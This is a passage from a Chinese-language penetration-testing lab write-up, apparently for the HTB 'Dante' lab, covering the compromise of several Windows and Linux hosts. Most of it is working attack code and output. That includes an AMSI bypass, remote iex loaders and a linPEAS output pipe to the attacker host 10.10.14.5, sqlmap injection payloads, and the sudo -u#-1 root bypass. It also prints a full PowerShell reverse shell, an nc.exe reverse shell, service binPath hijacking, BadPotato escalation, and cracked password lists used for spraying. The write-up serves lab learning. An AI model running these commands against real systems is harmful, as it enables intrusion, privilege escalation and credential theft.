执行后可以得到 meterpreter。
### 提权信息收集: winPEAS
远程加载 PowerSharpPack.ps1 
```bash
iex(new-object net.webclient).downloadstring('http://10.10.14.5:9999/PowerSharpPack.ps1')
```
加载时返回下面的报错，应该是没有绕过 AMSI。
```bash
This script contains malicious content and has been blocked by your antivirus software.
```
绕过 AMSI：
```powershell
$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)

(new-object system.net.webclient).downloadstring('http://10.10.14.5:9999/amsi_rmouse.txt')|IEX
```
再次加载 PowerSharpPack.ps1
```powershell
iex(new-object net.webclient).downloadstring('http://10.10.14.5:9999/PowerSharpPack.ps1')
```
执行 winPEAS 组件：
```bash
PowerSharpPack -winPEAS
```
执行之后可以得到大量的输出。
1. 存在历史漏洞 CVE-2019-1385、CVE-2019-1405
    ```bash
    [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
        OS Build Number: 18363
        [!] CVE-2019-1385 : VULNERABLE
            [>] https://www.youtube.com/watch?v=K6gHnr-VkAg

        [!] CVE-2019-1405 : VULNERABLE
            [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/ 
    ```
2. Interesting Services -non Microsoft
   1. Druva
   2. OpenSSH
3. DLL 劫持路径
    ```
    C:\WINDOWS\system32
    C:\WINDOWS
    C:\WINDOWS\System32\Wbem
    C:\WINDOWS\System32\WindowsPowerShell\v1.0\
    C:\WINDOWS\System32\OpenSSH\
    ```

### 提权：CVE-2019-1405(未成功)
当 Windows 通用即插即用 (UPnP) 服务不正确地允许 COM 对象创建时，就会存在权限提升漏洞，因此该漏洞也被称为"Windows UPnP 服务权限提升漏洞"。

Exp
- https://github.com/apt69/COMahawk
- https://github.com/Al1ex/WindowsElevation/tree/master/CVE-2019-1405

上传 exp，执行后未成功。

### 漏洞服务提权（Druva）
winPEAS 对非 Microsoft 的服务进行扫描时，扫描出了一个 Druva 服务。

msf 搜索 Druva 可以得到一个提权 exp。
- exploit/windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc

Druva 的版本信息可以通过查看 licence.txt 文件获取。
```bash
type "c:\Program Files (x86)\Druva\inSync\licence.txt"
Druva InSync 6.6.3
Copyright (c) 2019 Druva Inc. 
```
6.6.3 版本也在 exploit/windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc 的利用范围内。

利用后可以得到 SYSTEM 权限。
```bash
msf6 exploit(windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc) > set LHOST 10.10.14.5
LHOST => 10.10.14.5
msf6 exploit(windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc) > set LPORT 5555
msf6 exploit(windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc) > set session 39
session => 39
msf6 exploit(windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc) > exploit

[*] Started reverse TCP handler on 10.10.14.5:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. Service 'inSyncCPHService' exists.
[*] Connecting to 127.0.0.1:6064 ...
[*] Sending packet (260 bytes) to 127.0.0.1:6064 ...
[*] Sending stage (175686 bytes) to 10.10.110.3
[*] Meterpreter session 41 opened (10.10.14.5:5555 -> 10.10.110.3:21927) at 2023-12-26 20:01:51 -0500

meterpreter >
```

## Linux: 172.16.1.12
开放端口：
```bash
172.16.1.12	21
172.16.1.12	80
172.16.1.12	22
172.16.1.12	443
172.16.1.12	3306
```
### 80 端口 SQL 注入
80 端口也是一个 xampp 服务，与 172.16.1.13 的版本基本一致。
```bash
python /webtools/dirscan/dirsearch/dirsearch.py -u http://172.16.1.12 -e php -p socks5://localhost:1080 -w /webtools/dicts/SecLists/Discovery/Web-Content/common.txt

[20:11:05] Starting:                                                                                                                                            
[20:11:27] 301 -  232B  - /blog  ->  http://172.16.1.12/blog/               
[20:11:31] 403 -    1KB - /cgi-bin/                                         
[20:11:37] 301 -  237B  - /dashboard  ->  http://172.16.1.12/dashboard/     
[20:11:47] 200 -   30KB - /favicon.ico                                      
[20:11:56] 301 -  231B  - /img  ->  http://172.16.1.12/img/                 
[20:12:17] 403 -    1KB - /phpmyadmin                                       
[20:12:48] 301 -  237B  - /webalizer  ->  http://172.16.1.12/webalizer/  
```
扫描到一个 /blog 目录。

根据博客的 footer 信息：`Responsive Blog Site 2023 - Brought To You by Ser Bermz` 可以找到该 CMS 的相关信息：https://www.youtube.com/channel/UCsFgC9ggwrmYR2XqEHXpbNg

进一步定位到源码：[Responsive Online Blog Website Using PHP/MySQL | CampCodes](https://www.campcodes.com/projects/php/responsive-online-blog-website-using-php-mysql-free-download/)

在 exploitdb 中可以查询到该 CMS 的历史漏洞
- [Responsive Online Blog 1.0 - 'id' SQL Injection - PHP webapps Exploit](https://www.exploit-db.com/exploits/48615)

POC:
```bash
sqlmap 'http://172.16.1.12/blog/category.php?id=1' --dbs --batch --proxy socks5://localhost:1080
```
枚举出所有的数据库
```bash
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 202 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: id=1' RLIKE (SELECT (CASE WHEN (1163=1163) THEN 1 ELSE 0x28 END))-- mDDs

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 3351 FROM(SELECT COUNT(*),CONCAT(0x7176626a71,(SELECT (ELT(3351=3351,1))),0x71706b6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- QmkZ

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 5794 FROM (SELECT(SLEEP(5)))qeMR)-- MjCh

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=-4778' UNION ALL SELECT NULL,CONCAT(0x7176626a71,0x50687146794d544756786254455a6153556a736c776e696c6e77516c78476a454c636c727474756d,0x71706b6a71)#
---
[20:46:01] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.7, Apache 2.4.43
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[20:46:03] [INFO] fetching database names
[20:46:06] [INFO] retrieved: 'information_schema'
[20:46:07] [INFO] retrieved: 'test'
[20:46:08] [INFO] retrieved: 'performance_schema'
[20:46:09] [INFO] retrieved: 'flag'
[20:46:10] [INFO] retrieved: 'mysql'
[20:46:11] [INFO] retrieved: 'blog_admin_db'
[20:46:12] [INFO] retrieved: 'phpmyadmin'
available databases [7]:                                                                                                                                       
[*] blog_admin_db
[*] flag
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test
```
逐步获取 flag 数据库中的字段。
```bash
sqlmap 'http://172.16.1.12/blog/category.php?id=1' --dbs --batch --proxy socks5://localhost:1080 -D flag -T flag -C flag --dump

[20:48:28] [INFO] fetching entries of column(s) 'flag' for table 'flag' in database 'flag'
Database: flag
Table: flag
[1 entry]
+------------------------------+
| flag                         |
+------------------------------+
| DANTE{wHy_y0U_n0_s3cURe?!?!} |
+------------------------------+
```

使用 --os-shell 无法写入 webshell，可能是没有写权限，无法成功。

尝试在 blog_admin_db 中寻找一些敏感信息。枚举所有用户：
```bash
sqlmap 'http://172.16.1.12/blog/category.php?id=1' --batch --proxy socks5://localhost:1080 --technique U -D blog_admin_db -T membership_users --dump
```

结果如下：
```bash
admin	21232f297a57a5a743894a0e4a801fc3 (admin)
egre55	d6501933a2e0ea1f497b87473051417f
test	098f6bcd4621d373cade4e832627b4f6 (test)
test1	739969b53246b2c727850dbb3490ede6 (test9)
test2	ad0234829205b9033196ba818f7a872b (test2)
memberID	passMD5
ben	442179ad1de9c25593cabf625c0badb7
```
### MD5 爆破（john）
ben 用户的 hash 可以使用 john 进行爆破，得到密码: Welcometomyblog
```bash
john --wordlist=/webtools/dicts/rockyou.txt md5hash --format=Raw-MD5
```

使用上面的凭证登陆 ssh，admin 用户得到 Permission denied，ben 用户可以成功登陆。
```bash
p -q ssh ben@172.16.1.12
```
使用 linPEAS 进行提权信息收集
```bash
## linPEAS
nc -lvnp 9002 | tee linpeas.out #Host
wget -q -O- 10.10.14.5:9999/linpeas.sh | sh | nc 10.10.14.5 9002 #Victim
```

### 提权: PwnKit
linPEAS 扫描出较多提权漏洞:
```bash
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.

```
Pwnkit 可成功提权。
```bash
ben@DANTE-NIX04:~/.tmp$ ./.pw
root@DANTE-NIX04:/home/ben/.tmp# 
```
### 提权: sudo < 1.8.28
sudo 版本为 1.8.27。
```bash
ben@DANTE-NIX04:~/.tmp$ sudo -V
Sudo version 1.8.27
Sudoers policy plugin version 1.8.27
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.27 
```
hacktricks 中记录了一个 sudo 版本小于 1.8.28 的 payload
```bash
sudo -u#-1 /bin/bash
```
可以直接提权到 root
```bash
ben@DANTE-NIX04:~/.tmp$ sudo -u#-1 /bin/bash
root@DANTE-NIX04:/home/ben/.tmp# 
```

/etc/shadow 文件中包含了一个提示：CrackMe。
```bash
julian:$1$CrackMe$U93HdchOpEUP9iUxGVIvq/:18439:0:99999:7:::
```
将 /etc/passwd 和 /etc/shadow 文件保存到本地，使用 unshadow 组合成一个文件，删除文件中的其他行，只留下 julian，最后使用 john 爆破。
```bash
unshadow 172.16.1.12_etc_passwd 172.16.1.12_shadowhash > 172.16.1.12_unshadow

john --wordlist=/webtools/dicts/rockyou.txt 172.16.1.12_unshadow
```
第一次爆破没有得到结果，但 john 提示我们使用参数 `--format=md5crypt-long`
```bash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:19 DONE (2023-12-27 07:13) 0g/s 712123p/s 712123c/s 712123C/s !!!0mc3t..*7¡Vamos!
Session completed. 
```
指定新的加密方式后可以正常跑出明文为 manchesterunited
```bash
john --wordlist=/webtools/dicts/rockyou.txt 172.16.1.12_unshadow --format=md5crypt-long

Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (julian)     
1g 0:00:00:00 DONE (2023-12-27 07:17) 25.00g/s 70400p/s 70400c/s 70400C/s bebito..medicina
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

至此我们掌握了多个用户凭证：
1. julian/manchesterunited
2. ben/Welcometomyblog
3. balthazar/TheJoker12345!
4. mrb3n/S3kur1ty2020!
5. Admin_129834765/SamsungOctober102030

还有此前在 172.16.1.20 中获取到的 excel 表格。
```bash
asmith	Princess1
smoggat	Summer2019
tmodle	P45678!
ccraven	Password1
kploty	Teacher65
jbercov	4567Holiday1
whaguey	acb123
dcamtan	WorldOfWarcraft67
tspadly	RopeBlackfieldForwardslash
ematlis	JuneJuly1TY
fglacdon	FinalFantasy7
tmentrso	65RedBalloons
dharding	WestminsterOrange5
smillar	MarksAndSparks91
bjohnston	Bullingdon1
iahmed	Sheffield23
plongbottom	PowerfixSaturdayClub777
jcarrot	Tanenbaum0001
lgesley	SuperStrongCantForget123456789
```
## Linux: 172.16.1.101
172.16.1.101	21
172.16.1.101	135
172.16.1.101	139
172.16.1.101	445

### FTP 爆破
172.16.1.101 的 ftp 不允许匿名登陆，并且 FileZilla Server 0.9.60 beta 不存在可用的 exp。

借助此前获取的用户名密码，我们可以爆破 ftp，首先将用户名保存在 users.txt 密码保存在 password.txt 中。然后运行 hydra。
```bash
export HYDRA_PROXY=socks5://localhost:1080 
hydra -L users.txt -P password.txt 172.16.1.101 ftp -V
```
默认情况下 hydra 会对单个用户名尝试所有的密码，为了加快速度，我们可以使用 combine 模式来将用户名密码一一对应。先将用户名密码以 : 切分写在单个文件中。
```bash
asmith:Princess1
smoggat:Summer2019
tmodle:P45678!
ccraven:Password1
kploty:Teacher65
jbercov:4567Holiday1
whaguey:acb123
dcamtan:WorldOfWarcraft67
tspadly:RopeBlackfieldForwardslash
ematlis:JuneJuly1TY
fglacdon:FinalFantasy7
tmentrso:65RedBalloons
dharding:WestminsterOrange5
smillar:MarksAndSparks91
bjohnston:Bullingdon1
iahmed:Sheffield23
plongbottom:PowerfixSaturdayClub777
jcarrot:Tanenbaum0001
lgesley:SuperStrongCantForget123456789
julian:manchesterunited
ben:Welcometomyblog
balthazar:TheJoker12345!
mrb3n:S3kur1ty2020!
Admin_129834765:SamsungOctober102030
```

然后 hydra 爆破时使用 -C 参数。
```bash
export HYDRA_PROXY=socks5://localhost:1080 
hydra -C combine.txt 172.16.1.101 ftp -V
```
很快就能够得到结果，dharding/WestminsterOrange5 可以正常登陆
```bash
[21][ftp] host: 172.16.1.101   login: dharding   password: WestminsterOrange5
```
登陆之后获取到 `Remote login.txt`
```bash
Dido,
I've had to change your account password due to some security issues we have recently become aware of

It's similar to your FTP password, but with a different number (ie. not 5!)

Come and see me in person to retrieve your password.

thanks,
James                                                                                                                    
```
从提示中可以看出该用户远程登陆的密码与 FTP 密码相同但最后一个数字不是 5。因此我们可以构造一个密码字典来进行爆破。

### SMB 爆破
这台主机没有 ssh,也没有开放 3389 端口，但可以尝试用 smb 来验证密码是否正确。

cme 或者 nxc 集成了 SMB 爆破的功能。
```bash
p -q crackmapexec smb 172.16.1.101 -u users.txt -p password.txt
```
尝试到 WestminsterOrange17 时成功登陆。
```bash
SMB         172.16.1.101    445    DANTE-WS02       [*] Windows 10.0 Build 18362 x64 (name:DANTE-WS02) (domain:DANTE-WS02) (signing:False) (SMBv1:False)
SMB         172.16.1.101    445    DANTE-WS02       [-] DANTE-WS02\dharding:WestminsterOrange0 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       [-] DANTE-WS02\dharding:WestminsterOrange1 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       [-] DANTE-WS02\dharding:WestminsterOrange2 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       [-] DANTE-WS02\dharding:WestminsterOrange3 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       [-] DANTE-WS02\dharding:WestminsterOrange4 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       [-] DANTE-WS02\dharding:WestminsterOrange6 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       [-] DANTE-WS02\dharding:WestminsterOrange7 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       [-] DANTE-WS02\dharding:WestminsterOrange8 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       [-] DANTE-WS02\dharding:WestminsterOrange9 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       [-] DANTE-WS02\dharding:WestminsterOrange10 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       [-] DANTE-WS02\dharding:WestminsterOrange11 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       [-] DANTE-WS02\dharding:WestminsterOrange12 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       [-] DANTE-WS02\dharding:WestminsterOrange13 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       [-] DANTE-WS02\dharding:WestminsterOrange14 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       [-] DANTE-WS02\dharding:WestminsterOrange15 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       [-] DANTE-WS02\dharding:WestminsterOrange16 STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       [+] DANTE-WS02\dharding:WestminsterOrange17
```
### WinRM 远程登陆
172.16.1.101 实际上开放了 5985 端口，此前使用 fscan 扫描时没有扫到的原因在于，fscan 默认扫描端口："21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017"

goby 企业端口列表中也没有 5985：
```bash
21,22,23,25,53,U:53,U:69,80,81,U:88,110,111,U:111,123,U:123,135,U:137,139,U:161,U:177,389,U:427,443,445,465,500,515,U:520,U:523,548,623,U:626,636,873,902,1080,1099,1433,U:1434,1521,U:1604,U:1645,U:1701,1883,U:1900,2049,2181,2375,2379,U:2425,3128,3306,3389,4730,U:5060,5222,U:5351,U:5353,5432,5555,5601,5672,U:5683,5900,5938,5984,6000,6379,7001,7077,8080,8081,8443,8545,8686,9000,9001,9042,9092,9100,9200,9418,9999,11211,U:11211,27017,U:33848,37777,50000,50070,61616
```

以后使用 fscan 扫描时可以使用 goby 内置的常用端口列表：
```bash
fscan -h 172.16.1.0/24 -socks5 127.0.0.1:1080 -p "1,7,9,13,19,21-23,25,37,42,49,53,69,79-81,85,105,109-111,113,123,135,137-139,143,161,179,222,264,384,389,402,407,443-446,465,500,502,512-515,523-524,540,548,554,587,617,623,689,705,771,783,873,888,902,910,912,921,993,995,998,1000,1024,1030,1035,1090,1098-1103,1128-1129,1158,1199,1211,1220,1234,1241,1300,1311,1352,1433-1435,1440,1494,1521,1530,1533,1581-1582,1604,1720,1723,1755,1811,1900,2000-2001,2049,2082,2083,2100,2103,2121,2199,2207,2222,2323,2362,2375,2380-2381,2525,2533,2598,2601,2604,2638,2809,2947,2967,3000,3037,3050,3057,3128,3200,3217,3273,3299,3306,3311,3312,3389,3460,3500,3628,3632,3690,3780,3790,3817,4000,4322,4433,4444-4445,4659,4679,4848,5000,5038,5040,5051,5060-5061,5093,5168,5247,5250,5351,5353,5355,5400,5405,5432-5433,5498,5520-5521,5554-5555,5560,5580,5601,5631-5632,5666,5800,5814,5900-5910,5920,5984-5986,6000,6050,6060,6070,6080,6082,6101,6106,6112,6262,6379,6405,6502-6504,6542,6660-6661,6667,6905,6988,7001,7021,7071,7080,7144,7181,7210,7443,7510,7579-7580,7700,7770,7777-7778,7787,7800-7801,7879,7902,8000-8001,8008,8014,8020,8023,8028,8030,8080-8082,8087,8090,8095,8161,8180,8205,8222,8300,8303,8333,8400,8443-8444,8503,8800,8812,8834,8880,8888-8890,8899,8901-8903,9000,9002,9060,9080-9081,9084,9090,9099-9100,9111,9152,9200,9390-9391,9443,9495,9809-9815,9855,9999-10001,10008,10050-10051,10080,10098,10162,10202-10203,10443,10616,10628,11000,11099,11211,11234,11333,12174,12203,12221,12345,12397,12401,13364,13500,13838,14330,15200,16102,17185,17200,18881,19300,19810,20010,20031,20034,20101,20111,20171,20222,22222,23472,23791,23943,25000,25025,26000,26122,27000,27017,27888,28222,28784,30000,30718,31001,31099,32764,32913,34205,34443,37718,38080,38292,40007,41025,41080,41523-41524,44334,44818,45230,46823-46824,47001-47002,48899,49152,50000-50004,50013,50500-50504,52302,55553,57772,62078,62514,65535" -nobr -nopoc
```

5985 端口可以使用 evil-winrm 进行连接。
```bash
p -q evil-winrm -i 172.16.1.101 -u dharding -p WestminsterOrange17
```
登陆之后可以查看 dharding 用户的 flag.txt

### 提权: 服务 ACL 配置错误
dharding Desktop 目录中有一个 qc 文件，内容为 IObitUnSvr。

使用 evil-winrm 加载 winPEAS。（evil-winrm 加载 ps 脚本的速度比较慢）
```bash
p -q evil-winrm -i 172.16.1.101 -u dharding -p WestminsterOrange17 -s /webtools/movement/PowerSharpPack/PowerSharpBinaries
Bypass-4MSI
Invoke-winPEAS.ps1
Invoke-winPEAS
```

关注非微软程序或服务，可以看到有一个 IObit Uninstaller。
```bash
╔══════════╣ Scheduled Applications --Non Microsoft--
╚ Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                                              
    (dharding) Uninstaller_SkipUac_dharding: C:\Program Files (x86)\IObit\IObit Uninstaller\IObitUninstaler.exe /UninstallExplorer 
```
查询 exploitdb 可以发现该应用存在历史漏洞：

```bash
----------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                   |  Path
----------------------------------------------------------------------------------------------------------------- ---------------------------------
IObit Uninstaller 10 Pro - Unquoted Service Path                                                                 | windows/local/49371.txt
IObit Uninstaller 9.1.0.8 - 'IObitUnSvr' Unquoted Service Path                                                   | windows/local/47538.txt
IObit Uninstaller 9.5.0.15 - 'IObit Uninstaller Service' Unquoted Service Path                                   | windows/local/48543.txt
----------------------------------------------------------------------------------------------------------------- ---------------------------
```
目录下的 History.txt 包含了版本信息，版本为 9.5，存在 Unquoted Service Path 提权漏洞。该漏洞的利用需要在 C:\Program Files (x86)\IObit 写入恶意的 IObit.exe，但该路径没有写入权限。

```bash
icacls .
. NT SERVICE\TrustedInstaller:(I)(F)
  NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
  NT AUTHORITY\SYSTEM:(I)(F)
  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
  BUILTIN\Administrators:(I)(F)
  BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
  BUILTIN\Users:(I)(RX)
  BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
  CREATOR OWNER:(I)(OI)(CI)(IO)(F)
  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
```

通过 Get-ServiceAcl.ps1 查看 IObitUnSvr 服务的 ACL 时，发现 dharding 具备 ChangeConfig 权限，可以更改配置。
```bash
*Evil-WinRM* PS C:\Users\dharding\Documents> Get-ServiceAcl.ps1
*Evil-WinRM* PS C:\Users\dharding\Documents> "IObitUnSvr" | Get-ServiceAcl | select -ExpandProperty Access

ServiceRights     : QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Start, Stop, Interrogate, ReadControl
AccessControlType : AccessAllowed
IdentityReference : DANTE-WS02\dharding
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None
```
因此只需要更改服务的 binPath，然后重启服务即可提权。

首先准备一个反弹 shell 的 bat 脚本：runme.bat
```bash
@echo off
start /b powershell.exe -exec bypass -enc <base64_encoded_payload> 
exit /b
```
其中的 base64_encoded_payload 原始 payload 如下：
```bash
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```
使用 UTF-16LE 和 base64 编码后进行填充写入 runme.bat

将 runme.bat 下载到 c:\temp 下。
```powershell
mkdir c:\temp
cd c:\temp
(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5:9999/runme.bat','c:\temp\runme.bat')
```
本地监听 9001：
```bash
nc -lvp 9001
```
接着在目标中更改 IObitUnSvr 的配置。
```powershell
sc.exe stop IObitUnSvr
sc.exe config IObitUnSvr binPath="cmd.exe /c c:\temp\runme.bat"
sc.exe qc IObitUnSvr
sc.exe start IObitUnSvr
```
启动 IObitUnSvr 可以接收到 shell。
```powershell
    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       08/01/2021     05:34             33 flag.txt                                                              
-a----       14/07/2020     03:18           1417 Microsoft Edge.lnk                                                    


PS C:\Users\Administrator\Desktop> cat flag.txt
DANTE{Qu0t3_I_4M_secure!_unQu0t3}
```


## Windows: 172.16.1.102
开放端口：
```bash
5985,135,445,3389,139,3306,443,47001,80,5040
```
1. 80/443: Online Marriage Registration System
2. 47001: Microsoft-HTTPAPI/2.0

### 80 端口文件上传漏洞
80 端口部署了一个 Online Marriage Registration System。exploitdb 可以搜索到相关的 exp：
- https://www.exploit-db.com/exploits/49557

首先上传 nc 
```bash
p -q python /webtools/exploit/OMRS/exp.py -u http://172.16.1.102/ -c 'powershell.exe wget 10.10.14.5:9999/nc.exe -O nc.exe'
```

然后使用 nc 反弹 shell。

```bash
p -q python /webtools/exploit/OMRS/exp.py -u http://172.16.1.102/ -c 'nc.exe -e powershell.exe 10.10.14.5 9001'
```

获取到 dante-ws03\blake 权限后可读取用户 flag.txt

### 提权: BadPotato
首先使用 winPEAS 收集信息，可以将结果写到文件，然后拖回来分析。
```powershell
iex(new-object net.webclient).downloadstring('http://10.10.14.5:9999/Invoke-winPEAS.ps1')
Invoke-winPEAS >> .out
```
dante-ws03\blake 具备 SeImpersonatePrivilege 权限，可以使用 Potato 家族进行提权。
```bash
    SeShutdownPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeUndockPrivilege: DISABLED
    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
    SeTimeZonePrivilege: DISABLED
```

BadPotato 是 SweetPotato 的 C# 版本，PowerSharpPack 中已经集成了 BadPotato 的 powershell 版本。
```bash
mkdir c:\temp
cd c:\temp
(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5:9999/runme.bat','c:\temp\runme.bat')

iex(new-object net.webclient).downloadstring('http://10.10.14.5:9999/Invoke-BadPotato.ps1')

Invoke-BadPotato -Command "c:\temp\runme.bat"
```
